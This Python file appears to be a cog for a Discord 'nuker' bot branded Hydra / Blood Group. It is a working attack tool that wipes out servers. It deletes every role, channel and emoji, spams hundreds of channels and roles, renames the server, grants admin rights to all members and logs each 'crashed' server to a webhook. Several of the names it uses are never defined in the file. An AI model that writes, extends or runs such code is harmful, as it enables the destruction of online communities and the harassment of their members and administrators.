# coding: utf-8
import os
import json
import discord
import subprocess
import datetime
from os import system, name
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)


class Classic(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Automatic server destruction
    @commands.command(aliases=['auto', 'nuke', 'crash'])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def attack(self, ctx):
        guild = ctx.guild

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                async with aiohttp.ClientSession() as session:
                    webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
                    embed = discord.Embed(
                        title = f'Hydra | Nuked server {guild.name}',
                        description = f'''
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **All users:** `{len(ctx.guild.members)}`
> **All channels:** `{len(ctx.guild.channels)}`
> **All roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`

**Time crash:** `{datetime.datetime.now()}`''',
                        colour = 0xE4C924
                    )

                    embed.add_field( # Информация о количестве каналов на крашнутом сервере: 1. Общее количество; 2. Количество голосовых каналов; 3. Количество категорий.
                        name = "🗃 | Information about the channels",
                        value = f"""
> **Text Channels:** `{len(ctx.guild.text_channels)}`
> **Voice Channels:** `{len(ctx.guild.voice_channels)}`
> **Categories:** `{len(ctx.guild.categories)}`""",
                        inline = False
                    )

                    embed.add_field( # Информация о количестве участников на крашнутом сервере: 1. Общее количество; 2. Количество людей; 3. Количество ботов; 4. Количество администраторов; Количество модераторов.
                        name = "😀 | Information about the participants",
                        value = f"""
> **All users:** `{len(ctx.guild.members)}`
> **People:** `{len([m for m in ctx.guild.members if not m.bot])}`
> **Bots:** `{len([m for m in ctx.guild.members if m.bot])}`
> **Administrators:** `{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}`
> **Moderators:** `{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}`""",
                        inline = False
                    )

                    embed.add_field(  # Информация о количестве ролей на крашнутом сервере: 1. Общее количество; 2. Количество ролей с правами администрации; 3. Количество людей с модераторскими правами(изгнание с сервера).
                        name = "🚦 | Information about the roles",
                        value = f"""
> **All roles:** `{len(ctx.guild.roles)}`
> **Moderation roles:** `{len([r for r in ctx.guild.roles if r.permissions.kick_members])}`
> **Administration roles:** `{len([r for r in ctx.guild.roles if r.permissions.administrator])}`
""",
                        inline = False
                    )

                    embed.set_thumbnail(url=ctx.guild.icon_url)
                    embed.set_image(url='https://media.discordapp.net/attachments/1045645133003104270/1045647837200908288/image.png?width=1108&height=443')
                    embed.set_footer(
                        icon_url = "https://media.discordapp.net/attachments/1045645133003104270/1045656058741403658/image.png?width=536&height=536", 
                        text = "Crashed By Hydra - Blood Group Official"
                    )     
                    await webhook.send(embed=embed)

            except Exception as e:
                print(e)
                pass

            try:
                await ctx.message.delete()

                self.client.loop.create_task(everyone_admins(ctx)) # Give administrator rights to all participants.
                self.client.loop.create_task(r3name(ctx)) # Changing the server name and avatar.
                self.client.loop.create_task(deleting_channels(ctx)) # Deleting all channels.
                self.client.loop.create_task(creating_channels(ctx)) # Mass creation of channels.
                self.client.loop.create_task(deleting_roles(ctx)) # Deleting all roles.
                self.client.loop.create_task(emoji_deleting(ctx)) # Deleting all emojis.
                self.client.loop.create_task(creating_roles(ctx)) # Mass creation of roles.

            except Exception as e: print(e)


    # Deleting all roles.
    @commands.command(aliases=["delr", "del_roles", "delete_roles", "del_role", "delete_role"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def delroles(self, ctx):
        guild = ctx.guild

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                for role in ctx.guild.roles:
                    try:
                        await role.delete()
                    except:
                        try:
                            await role.delete()
                        except:
                            pass

            except Exception as e: print(e)


    # Deleting all channels.
    @commands.command()
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def delchannels(self, ctx):

        guild = ctx.guild

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()
                    
                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                    except:
                        try:
                            await channel.delete()
                        except:
                            pass

            except Exception as e: print(e)


    # Mass creation of channels.
    @commands.command(aliases=["spam_channels", "s_channels", "spam_c", "spam_chan", "s_chan"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def channels(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                for n in range(500):
                    try:
                        await ctx.guild.create_text_channel(channels_name)
                        # await ctx.guild.create_category_channel(channels_name)
                        # await ctx.guild.create_voice_channel(channels_name)
                    except:
                        try:
                            await ctx.guild.create_text_channel(channels_name)
                            # await ctx.guild.create_category_channel(channels_name)
                            # await ctx.guild.create_voice_channel(channels_name)
                        except:
                            pass

            except Exception as e: print(e)


    # Mass creation of roles.
    @commands.command(aliases=["role_spam", "roles_spam", "r_spam", "rs_spam", "r_s", "rs_s"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def roles(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                for i in range(0, 100):
                    try:
                        await ctx.guild.create_role(name=roles_name)
                    except:
                        try:
                            await ctx.guild.create_role(name=roles_name)
                        except:
                            pass

            except Exception as e: print(e)


    # Deleting all emojis.
    @commands.command(aliases=["del_emoji", "delete_emoji", "d_emoji", "d_e"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def delemoji(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                for emoji in list(ctx.guild.emojis):
                    try:
                        await emoji.delete()
                    except:
                        try:
                            await emoji.delete()
                        except:
                            pass

            except Exception as e: print(e)


    # Changing the server name and avatar.
    @commands.command(aliases=["set_name", "set_server", "rename_server", "rename_guild", "r_server", "r_guild", "rn"])
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def rename(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:
                await ctx.message.delete()

                with open(f'ARMAGEDDON/{avatar_file}', 'rb') as f:
                    icon = f.read()
                await ctx.guild.edit(icon=icon)
                await ctx.guild.edit(name=server_name)

            except Exception as e: print(e)


def setup(client):
    client.add_cog(Classic(client))
